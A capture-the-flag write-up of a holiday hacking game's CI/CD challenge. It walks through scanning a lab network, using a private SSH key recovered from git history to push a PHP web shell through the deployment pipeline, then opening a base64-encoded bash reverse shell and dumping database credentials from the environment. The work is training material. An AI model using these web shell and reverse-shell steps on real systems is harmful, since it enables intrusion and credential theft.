# CI-CD Pipeline Challenge

Upon opening the terminal (and waiting a bit for it to build itself out completely) I am presented with this introduction:

```
######################################################
Mon Dec 12 18:30:26 UTC 2022
On attempt [7] of trying to connect.
If no connection is made after [60] attempts
contact the holidayhack sys admins via discord.
######################################################
 
Greetings Noble Player, 

Many thanks for answering our desperate cry for help!

You may have heard that some evil Sporcs have opened up a web-store selling 
counterfeit banners and flags of the many noble houses found in the land of 
the North! They have leveraged some dastardly technology to power their 
storefront, and this technology is known as PHP! 

***gasp*** 

This strorefront utilizes a truly despicable amount of resources to keep the 
website up. And there is only a certain type of Christmas Magic capable of 
powering such a thing… an Elfen Ring!

Along with PHP there is something new we've not yet seen in our land. 
A technology called Continuous Integration and Continuous Deployment! 

Be wary! 

Many fair elves have suffered greatly but in doing so, they've managed to 
secure you a persistent connection on an internal network. 

BTW take excellent notes! 

Should you lose your connection or be discovered and evicted the 
elves can work to re-establish persistence. In fact, the sound off fans
and the sag in lighting tells me all the systems are booting up again right now.  

Please, for the sake of our Holiday help us recover the Ring and save Christmas!
grinchum-land:~$ 
```

## Poking Around

This is a robust challenge that doesn't really give you much to go on.

However, the following things are currently obvious:

!!! note 'What I know'
    1) I am in a docker container
    2) I have root on the docker container
    3) There is a git repository located at `http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal`.

The only reason I know of the gitlab repository is due to Tinsel Upatree informing me after solving the [Prison Escape](prisonescape.md) challenge. I suppose that counts as OSINT, right?

The host I am currently on is a fabricated host inside the Sporc's internal network. I have some rudimentary tools (a bit less than I'm used to, but beggers and choosers and all that), but certainly enough to get the job done.

I decided to use nmap to find active hosts on our `172.18.0.0/16` subnet.

!!! abstract ""
    `#!sh nmap -sP 172.18.0.0/16`

I discovered the following hosts up:

!!! abstract "Nmap Results"
    ```
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-14 17:49 GMT
    Nmap scan report for 172.18.0.1
    Host is up (0.00063s latency).
    Nmap scan report for wordpress-db.local_docker_network (172.18.0.87)
    Host is up (0.00047s latency).
    Nmap scan report for wordpress.local_docker_network (172.18.0.88)
    Host is up (0.00019s latency).
    Nmap scan report for grinchum-land.flag.net.internal (172.18.0.99)
    Host is up (0.00018s latency).
    Nmap scan report for gitlab.local_docker_network (172.18.0.150)
    Host is up (0.00028s latency).
    Nmap scan report for gitlab-runner.local_docker_network (172.18.1.149)
    Host is up (0.00019s latency).
    Nmap scan report for postgresql.local_docker_network (172.18.1.200)
    Host is up (0.00032s latency).
    Nmap scan report for redis.local_docker_network (172.18.2.87)
    Host is up (0.00051s latency).
    ```

And that's a little difficult on the eyes, so here's a more readable version of the above

!!! abstract "Better-formatted version"
    ```
    172.18.0.1
    wordpress-db.local_docker_network (172.18.0.87)
    wordpress.local_docker_network (172.18.0.88)
    grinchum-land.flag.net.internal (172.18.0.99)
    gitlab.local_docker_network (172.18.0.150)
    gitlab-runner.local_docker_network (172.18.1.149)
    postgresql.local_docker_network (172.18.1.200)
    redis.local_docker_network (172.18.2.87)
    ```

From a bit more specific nmap scans, I determined that the host `redis.local_docker_network (172.18.2.87)` had one port open that was -- you guessed it -- `redis` on port `6379`. This was a data store for quick memory access for web apps, among others. There are certainly attack vectors to consider if I have access to the redis store, but let's move on from that for now.

`gitlab-runner.local_docker_network (172.18.1.149)` did not have any open ports that I found, and `postgresql.local_docker_network (172.18.1.200)` only had port `5432/TCP` open for (surprise) PostgreSQL.

The `172.18.0.0/24` subnet was a bit more interesting.

This was a red herring. While it had a lot of ports, this was actually the host container hosting this challenge. The ports shown are forwarded to the docker hosts that are "visible" outside.

!!! failure "172.18.0.1"
    ```
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-14 22:10 GMT
    Nmap scan report for 172.18.0.1
    Host is up (0.0000040s latency).
    Not shown: 65529 closed tcp ports (reset)
    PORT      STATE SERVICE
    22/tcp    open  ssh
    80/tcp    open  http
    2222/tcp  open  EtherNetIP-1
    8080/tcp  open  http-proxy
    8088/tcp  open  radan-http
    10022/tcp open  unknown
    MAC Address: 02:42:86:81:BF:F0 (Unknown)
    ```

The database for the wordpress instance:

!!! abstract "wordpress-db.local_docker_network (172.18.0.87)"
    ```
    Nmap scan report for wordpress-db.local_docker_network (172.18.0.87)
    Host is up (0.0000070s latency).
    Not shown: 65534 closed tcp ports (reset)
    PORT     STATE SERVICE
    3306/tcp open  mysql
    MAC Address: 02:42:AC:12:00:57 (Unknown)
    ```
The wordpress site in question:

!!! tip "wordpress.local_docker_network (172.18.0.88)"
    ```
    Nmap scan report for wordpress.local_docker_network (172.18.0.88)
    Host is up (0.0000070s latency).
    Not shown: 65533 closed tcp ports (reset)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    MAC Address: 02:42:AC:12:00:58 (Unknown)
    ```

The Aforementioned Gitlab server:

!!! tip "gitlab.local_docker_network (172.18.0.150)"
    ```
    Nmap scan report for gitlab.local_docker_network (172.18.0.150)
    Host is up (0.0000070s latency).
    Not shown: 65532 closed tcp ports (reset)
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    8181/tcp open  intermapper
    MAC Address: 02:42:AC:12:00:96 (Unknown)
    ```

The domain was actually `flag.net.internal`, but the DNS would resolve back to the internal docker network. No matter!

## Playing With the Git Repository

As mentioned by Tinsel Upatree, I decided to poke around the repo:

!!! abstract ""
    `#!sh git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal`

Once I cloned the repo, I `cd`'d into the resulting `wordpress.flag.net.internal` directory and ran: 

!!! abstract ""
    `#!sh git log`

This gave me some interesting stuff...

!!! note ""
    ``` hl_lines="29-33"
    Date:   Wed Oct 26 13:58:15 2022 -0700

        updated wp-config

    commit a59cfe83522c9aeff80d49a0be2226f4799ed239
    Author: knee-oh <sporx@kringlecon.com>
    Date:   Wed Oct 26 12:41:05 2022 -0700

        update gitlab.ci.yml

    commit a968d32c0b58fd64744f8698cbdb60a97ec604ed
    Author: knee-oh <sporx@kringlecon.com>
    Date:   Tue Oct 25 16:43:48 2022 -0700

        test

    commit 7093aad279fc4b57f13884cf162f7d80f744eea5
    Author: knee-oh <sporx@kringlecon.com>
    Date:   Tue Oct 25 15:08:14 2022 -0700

        add gitlab-ci

    commit e2208e4bae4d41d939ef21885f13ea8286b24f05
    Author: knee-oh <sporx@kringlecon.com>
    Date:   Tue Oct 25 13:43:53 2022 -0700

        big update

    commit e19f653bde9ea3de6af21a587e41e7a909db1ca5
    Author: knee-oh <sporx@kringlecon.com>
    Date:   Tue Oct 25 13:42:54 2022 -0700

        whoops

    commit abdea0ebb21b156c01f7533cea3b895c26198c98
    Author: knee-oh <sporx@kringlecon.com>
    Date:   Tue Oct 25 13:42:13 2022 -0700

        added assets

    commit a7d8f4de0c594a0bbfc963bf64ab8ac8a2f166ca
    Author: knee-oh <sporx@kringlecon.com>
    Date:   Mon Oct 24 17:32:07 2022 -0700

        init commit
    ```

That "whoops" is interesting. Let's get a diff between that and the one before it to find out what made him redact something:

!!! abstract ""
    `#!sh git diff e19f653bde9ea3de6af21a587e41e7a909db1ca5 abdea0ebb21b156c01f7533cea3b895c26198c98`


And it returned:
!!! note ""
    ``` hl_lines="7-13 20"
    diff --git a/.ssh/.deploy b/.ssh/.deploy
    new file mode 100644
    index 0000000..3f7a9e3
    --- /dev/null
    +++ b/.ssh/.deploy
    @@ -0,0 +1,7 @@
    +-----BEGIN OPENSSH PRIVATE KEY-----
    +b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
    +QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
    +9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
    +AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
    +PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
    +-----END OPENSSH PRIVATE KEY-----
    diff --git a/.ssh/.deploy.pub b/.ssh/.deploy.pub
    new file mode 100644
    index 0000000..8c0b43c
    --- /dev/null
    +++ b/.ssh/.deploy.pub
    @@ -0,0 +1 @@
    +ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com
    ```

Got a private key. Cool. I can do some fancy linux stuff to pull the pub and priv keys out of the diff involving the `patch` binary, but since it doesn't exist on the container I'll have to copy-paste it out and massage it a bit to look like this:

!!! note "Private Key"
    ```
    -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
    QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
    9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
    AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
    PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
    -----END OPENSSH PRIVATE KEY-----

    user is `sporx`
    ```


With the new key, I can clone the repository as the sporx user! What I'll have to do first is start up an `ssh-agent` binary and add the key in memory. Good thing there isn't a password involved!

!!! abstract ""
    ```sh
    grinchum-land:~$ cat > sporx.key <<EOF
    > -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
    QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
    9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
    AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
    PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
    -----END OPENSSH PRIVATE KEY-----
    > EOF
    grinchum-land:~$ chmod 600 ./sporx.key 
    grinchum-land:~$ eval `ssh-agent`
    Agent pid 191
    grinchum-land:~$ ssh-add ./sporx.key 
    Identity added: ./sporx.key (sporx@kringlecon.com)
    ```

Now by adding the ssh key, I can clone the repo again...but I wonder what else I can do?

!!! abstract ""
    `#!sh git clone git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git`

Let's modify one of the PHP files to have a comment that I can grep out.

!!! abstract ""
    ```sh
    grinchum-land:~/wordpress.flag.net.internal$ vi index.php
    grinchum-land:~/wordpress.flag.net.internal$ git add index.php
    grinchum-land:~/wordpress.flag.net.internal$ git commit -m "tee hee"
    Author identity unknown

    *** Please tell me who you are.

    Run

      git config --global user.email "you@example.com"
      git config --global user.name "Your Name"

    to set your account's default identity.
    Omit --global to set the identity only in this repository.

    fatal: empty ident name (for <samways@grinchum-land.flag.net.internal>) not allowed
    grinchum-land:~/wordpress.flag.net.internal$ git config --global user.email 
    "totally-an-orc@kringlecon.com"
    
    grinchum-land:~/wordpress.flag.net.internal$ git config --global user.name "orcy"
    ```


And the addition I made to index.php?

!!! abstract ""
    `#!php echo("<!-- agr0 -->");`

A super-innocuous line of code. The idea here is if I `curl` the site after pushing it and grep out `agr0`, it should tell me several things:

 1. I have access to modify the code.
 2. I have access to modify _executable_ code (that is, if the word `#!php echo()` doesn't show up around it).

Then, I committed and pushed.

!!! note

Then ran a curl on the site and grepped for my tag...

!!! abstract ""
    ```sh
    grinchum-land:~/wordpress.flag.net.internal$ curl -s http://172.18.0.88 | grep agr0
    <!-- agr0 -->
    ```

Success! Not only did my HTML comment show up, but the `#!php echo()` function didn't, meaning that it executed my php code!

Now let's get a little interactive shell.

## It's a Christmas Miracle! (shell access)

I created the file `xmas.php`:

!!! abstract "xmas.php"
    ```php
    <?php
    system($_REQUEST['agr0']);
    ?>
    ```

This was super simple. Any command sent to the variable `agr0` would be executed in a shell environment. Because I used the `#!php $_REQUEST['agro']` variable, I can send _either_ a GET or POST request.

I then added it, committed it, and pushed it.

!!! abstract "git commits"
    ```sh
    grinchum-land:~/wordpress.flag.net.internal$ git add .
    grinchum-land:~/wordpress.flag.net.internal$ git commit -m "merry christmas"
    [main 5a6c7d4] merry christmas
     1 file changed, 1 insertion(+)
     create mode 100644 xmas.php
    grinchum-land:~/wordpress.flag.net.internal$ git push
    Enumerating objects: 4, done.
    Counting objects: 100% (4/4), done.
    Delta compression using up to 2 threads
    Compressing objects: 100% (2/2), done.
    Writing objects: 100% (3/3), 306 bytes | 306.00 KiB/s, done.
    Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
    To gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git
        37b5d57..5a6c7d4  main -> main
    grinchum-land:~/wordpress.flag.net.internal$ 
    ```

![Look at me](/img/elfhouse/lookatme.png)

!!! abstract ""
    ```sh
    grinchum-land:~/wordpress.flag.net.internal$ curl -s http://172.18.0.88/xmas.php?agr0=id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```

Confirmed I can use post vars, which is easier than GET vars:

!!! abstract ""
    ```sh
    grinchum-land:~/wordpress.flag.net.internal$ curl -sd "agr0=id" http://172.18.0.88/xmas.php
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```

So do we have bash?

!!! abstract ""
    ```sh
    grinchum-land:~/wordpress.flag.net.internal$ curl -sd "agr0=which bash" http://172.18.0.88/xmas.php
    /bin/bash
    ```

So can we kick back a shell?

![Yup](/img/elfhouse/yep-yup.gif)

First, because there are special characters that could get in the way of things, I decided to base64 encode my shell:

!!! abstract "Local"
    ```sh
    echo -n "/bin/bash -i >& /dev/tcp/172.18.0.99/9090 0>&1" | base64 -w0
    L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xOC4wLjk5LzkwOTAgMD4mMQ==
    ```
Then started up a reverse shell listener:

!!! abstract "Reverse Shell"
    ```sh
    grinchum-land:~$ nc -lvnp 9090
    Listening on [0.0.0.0] (family 0, port 9090)

    ```

Then...Eagle one, Fox two!

!!! abstract ""
    ```sh
    curl -sd 'agr0=echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xOC4wLjk5LzkwOTAgMD4mMQ== | base64 -d | bash' http://172.18.0.88/xmas.php
    ```

!!! success "Caught"
    ```sh
    grinchum-land:~$ nc -lvnp 9090
    Listening on [0.0.0.0] (family 0, port 9090)
    Connection from 172.18.0.88 60556 received!
    bash: cannot set terminal process group (1): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@wordpress:/var/www/html$ 
    ```

## Hacker Voice: "I'm in."

Generally, once I'm in as the `www-user` there isn't a whole lot I can _do_ per se, but there is a whole lot of information I can _read_. Specifically all the information that the web app needs to run! Database credentials, access to user login credentials (and users are notorious for re-using passwords), the works. This wordpress app runs in a docker container and most of the credentials are typically fed in to the app by means of environment variables. So I can type `env` and dump those right now:

!!! success "Environment Variables"
    ```sh
    HOSTNAME=wordpress.flag.net.internal
    PHP_VERSION=7.4.32
    APACHE_CONFDIR=/etc/apache2
    PHP_INI_DIR=/usr/local/etc/php
    GPG_KEYS=42670A7FE4D0441C8E4632349E4FDC074A4EF02D 5A52880781F755608BF815FC910DEB46F53EA312
    PHP_LDFLAGS=-Wl,-O1 -pie
    PWD=/var/www/html
    APACHE_LOG_DIR=/var/log/apache2
    LANG=C
    PHP_SHA256=323332c991e8ef30b1d219cb10f5e30f11b5f319ce4c6642a5470d75ade7864a
    APACHE_PID_FILE=/var/run/apache2/apache2.pid
    WORDPRESS_DB_HOST=wordpress-db
    PHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc   
    libc-dev                 make            pkg-config              re2c
    PHP_URL=https://www.php.net/distributions/php-7.4.32.tar.xz
    APACHE_RUN_GROUP=www-data
    APACHE_LOCK_DIR=/var/lock/apache2
    SHLVL=2
    PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
    WORDPRESS_DB_PASSWORD=wordpress-db-password
    WORDPRESS_ENV=true
    APACHE_RUN_DIR=/var/run/apache2
    APACHE_ENVVARS=/etc/apache2/envvars
    APACHE_RUN_USER=www-data
    WORDPRESS_DB_USER=wordpress-db-user
    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    WORDPRESS_DB_NAME=wordpress-db-name
    PHP_ASC_URL=https://www.php.net/distributions/php-7.4.32.tar.xz.asc
    PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
    _=/usr/bin/env
    OLDPWD=/var/www
    ```

So there we go, really...really bad database credentials.

!!! success "Wordpress creds"
    ```
    wordpress-db-user:wordpress-db-password
    ```

But we have all we need to succeed! The flag is located under `/flag.txt` on the wordpress server!

![The Flag](/img/elfhouse/jollycicd.png)

!!! success "Answer to Jolly CI/CD"
    ```
    oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT
    ```